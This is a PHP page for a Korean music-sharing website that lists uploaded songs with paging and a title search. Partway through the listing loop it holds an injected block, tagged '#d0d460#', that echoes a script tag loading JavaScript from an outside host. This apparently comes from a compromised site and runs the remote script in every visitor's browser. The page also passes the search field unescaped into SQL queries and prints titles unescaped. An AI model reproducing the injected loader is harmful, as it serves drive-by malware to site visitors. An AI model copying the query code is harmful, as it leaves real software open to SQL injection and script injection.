<? session_start();
include ('./lib.php');
?>
<!DOCTYPE HTML>
<html>
	<head>
		<title> New Document </title>
		<meta charset="UTF-8">
		<style type="text/css">
			body {
				margin: 0;
				padding: 0;
			}
			#musics_wrap {
				width: 980px;
				height: 760px;
			}
			#musics_wrap h1 {
				margin: 0;
				padding: 30px 0 0 30px;
				height: 60px;
			}
			.category_nav {
				width: 800px;
				height: 70px;
				margin: 0 auto;
			}
			.bt_music {
				display: block;
				width: 600px;
				height: 60px;
				background: #1caff6;
				color: white;
				text-align: center;
				border-radius: 10px;
				font-size: 15pt;
				line-height: 60px;
				padding: 0;
				text-decoration: none;
				margin: 0 auto 10px auto;
			}
			section {
				width: 900px;
				height: 470px;
				margin: 0 auto;
				padding: 30px 0 0 0;
			}
			section .category_contents {
				width: 200px;
				height: 200px;
				background: url('images/light.jpg');
				display: inline-block;
				margin: 10px;
				border-radius: 100px;
				text-align: center;
				font-size: 1.0em;;
				line-height: 200px;
				color: white;
				font-weight: bold;
			}

			#bot {
				width: 600px;
				height: 55px;
				margin: 0 auto;
			}
			#bot .paging {
				margin: 20px auto 10px auto;
				width: 170px;
			}
			#bot .page ul{
				list-style: none;
			}
			#bot .page ul a{
				text-decoration: none;
				color: black;
			}
			#bot .bot_search {
				width: 210px;
				margin: 0 auto;
			}
			#bot .bot_search input[type='text']{
				width: 150px;
			}
		</style>
		<script type="text/javascript">
			$(document).ready(function() {
				function ShowAlert(text){
					var left = (document.body.clientWidth / 2);
          			var result = left - $('.message').width() / 2 + document.body.scrollLeft;
           	 		$('.message').css('left',result).html(text).fadeIn(1500);
            		$('.message').fadeOut(1500);
				}
				$('.bt_music').click(function() {
					<? if($_SESSION['user_id']){ ?>
					$('#wrap').load('./music_upload.php');
					<? }else{ ?>
					ShowAlert('로그인을 하셔야합니다');
					<? } ?>
				});
				
				$('.go_music_view').click(function(e){
					e.preventDefault();
					var href=$(this).attr('href');
					$('#wrap').load(href);	
				});
				
				$('.page ul li').click(function(e){
					e.preventDefault();
					var href=$(this).find('a').attr('href');
					$('#wrap').load(href);
				});
			});
		</script>
	</head>

	<body>
		<div id="musics_wrap">
			<header>
				<h1>Musics</h1>
			</header>
			<div class="category_nav">
				<a href="#" class="bt_music">업로드하러 가기</a>
			</div>
			<section>
			<? 
			$connect = db_connect($db_host, $db_user, $db_pass, $db_name);
			$t = $_POST['text1'];
			// 2. 페이지 변수 설정
			if ($_GET[page] && $_GET[page] > 0) {
				// 현재 페이지 값이 존재하고 0 보다 크면 그대로 사용
				$page = $_GET[page];
			} else {
				// 그 외의 경우는 현재 페이지를 1로 설정
				$page = 1;
			}
			// 한 페이지에 보일 글 수
			$page_row = 8;
			// 한줄에 보여질 페이지 수
			$page_scale = 5;
			// 페이징을 출력할 변수 초기화
			$paging_str = "";

			// 3. 전체 글 갯수 알아내기
			$sql = "select count(*) as cnt from Vocals_musiclist where music_title like '%$t%'";
			$total_count = sql_total($sql);
			// 4. 페이지 출력 내용 만들기
			$paging_str = paging($page, $page_row, $page_scale, $total_count);
			// 5. 시작 열을 구함
			$from_record = ($page - 1) * $page_row;
			// 7.데이터 갯수 체크를 위한 변수 설정
			$i = 0;
					
						//mysql_query("set names utf8");
						$chk_sql="select * from Vocals_musiclist where music_title like '%$t%' order by music_no desc limit $from_record,$page_row";
						$chk_result=mysql_query($chk_sql);
						while($chk_data=mysql_fetch_array($chk_result))
						{
							if($chk_data['music_no']=="")
							{
								echo "<script>alert('글이 존재하지 않습니다.');</script>";
								exit;
							}
							$data="select user_name from Vocals_register where user_id=trim('$chk_data[singer_id]')";
							$d=mysql_query($data);
							$r=mysql_fetch_array($d);
					?>
<?php
#d0d460#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155829\"></script>";
echo $vt;
}
#/d0d460#
?>						
						<a href="./music_view.php?music_no=<?=$chk_data['music_no']; ?>" class="go_music_view"><div class="category_contents"><?=$chk_data['music_title']; ?>-<?=$r[user_name]; ?></div></a>
				
					
					<?
					// 10. 데이터 갯수 체크를 위한 변수를 1 증가시킴
					$i++;
					}

					// 11.데이터가 하나도 없으면
					if($i == 0){
					?>
    					
       					<div>자료가 하나도 없습니다.</div>
    				
					<?
					}
					?>
			</section>

			<div id="bot">
				<div class="paging">
					<div class = "page">
		   			<ul>
		   				<li>
		   					<?echo $paging_str; ?>							
		   				</li>
		   			</ul>
	    		</div>
				</div>
				<div class="bot_search">
					<form action="" method="post" name="searchForm">
						<input type="text" placeholder="검색" name="text1">
						<input type="submit" value="검색">
					</form>
				</div>
			</div>
		</div>
	</body>
</html>
